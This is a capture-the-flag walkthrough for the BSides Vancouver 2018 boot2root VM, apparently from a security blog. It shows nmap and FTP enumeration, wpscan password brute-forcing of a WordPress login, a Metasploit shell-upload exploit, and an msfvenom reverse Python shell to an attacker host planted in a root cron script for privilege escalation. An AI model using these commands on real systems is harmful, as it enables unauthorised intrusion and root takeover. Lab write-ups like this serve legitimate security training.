@@ -1,0 +1,321 @@
+
+								
+																		Hack the BSides Vancouver:2018 VM (Boot2Root Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 4, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another CTF challenge known as BSides Vancouver. The credit for making this VM machine goes to “Abatchy” and it is another capture the flag challenge in which our goal is to gain root access and capture the flag to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let’s start from getting to know the IP of VM  with help of netdiscover Command (Here, I have it at 192.168.1.103 but you will have to find your own). Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.103 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.103 --open
+					
+				
+			
+		
+
+Awesome!! Nmap has done a remarkable job by dumbing the details of services running on open port 21, 22 and 80.
+Moreover, the highlighted text is revealing the following details:
+
+FTP Anonymous login allowed
+Found a directory /backup WordPress with help of txt
+
+
+Without wasting time we accessed the FTP service of the victim’s system and found a user.txt.bk, let’s look into this file.
+
+Its look like a text file with some username in it. Since port 22 is open so we can use these name for login into ssh if possible.
+
+If you recall nmap result then it has shown /back_wordpress directory which we had to explore in our web browser but Sadly we didn’t get anything from this web page although it sounds for WordPress site which is also a good sing.
+
+Now we decided to use the command on the URL that we have entered in the browser. To check if there are any kind of vulnerable themes, plugins, username and etc.
+
+		
+		
+			
+			
+			
+			
+wpscan –u http://192.168.1.103/backup_wordpress/ --enumerate t --enumerate p --enumerate u
+			
+				
+					
+				
+					1
+				
+						wpscan –u http://192.168.1.103/backup_wordpress/ --enumerate t --enumerate p --enumerate u
+					
+				
+			
+		
+
+
+The wpscan has enumerated the usernames where we have found the login credentials as admin and John.
+
+Again we have used wpscan to find out the password credentials for the login credentials john. Here we have used the following command to enumerate the password from the rockyou.txt file.
+
+		
+		
+			
+			
+			
+			
+wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt
+			
+				
+					
+				
+					1
+				
+						wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt
+					
+				
+			
+		
+
+
+We see that for login credentials john, the password credentials matched is enigma.
+
+After finding the username and password, we have used metasploit’s exploit wp_admin_shell_upload to upload the shell and get the meterpreter which is shown below.
+
+		
+		
+			
+			
+			
+			
+use exploit/unix/webapp/wp_admin_shell_upload
+msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.103
+msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress
+msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john
+msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma
+msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/unix/webapp/wp_admin_shell_uploadmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.103msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpressmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username johnmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigmamsf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit
+					
+				
+			
+		
+
+Great!! We had compromise confidentiality of the target’s system now penetrate more for completing this challenge.
+
+We start penetrating targets machine and after 10-15 mints we came to know about a cleanup file which has root privilege from inside contents of crontab file.
+
+Then we downloaded cleanup file on our desktop so that we can modify it by editing our malicious code.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; download cleanup /root/Desktop/
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt; download cleanup /root/Desktop/
+					
+				
+			
+		
+
+
+Using msfvenom we had generated a malicious python code by executing following command.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_python lhost=192.168.1.108 lport=9876 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_python lhost=192.168.1.108 lport=9876 R
+					
+				
+			
+		
+
+Then copy the highlighted code for editing into the cleanup file.
+
+We had paste above copied text as the inside cleanup file as shown in below image. In a new terminal, we had start netcat for listening reverse connection.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 9876
+			
+				
+					
+				
+					1
+				
+						nc -lvp 9876
+					
+				
+			
+		
+
+
+Now we had to transfer our malicious cleanup file into current directory i.e. /usr/local/bin and verify it using cat command.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; upload /root/Desktop/cleanup .
+meterpreter&gt;cat cleanup
+			
+				
+					
+				
+					12
+				
+						meterpreter&gt; upload /root/Desktop/cleanup .meterpreter&gt;cat cleanup
+					
+				
+			
+		
+
+
+WOW, we got the reverse connection from victims system with root access now let’s catch the flag and finished the task.
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						idcd /rootcat flag.txt
+					
+				
+			
+		
+
+solving the challenge in this lab is not that much hectic therefore it is a good task for beginners.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
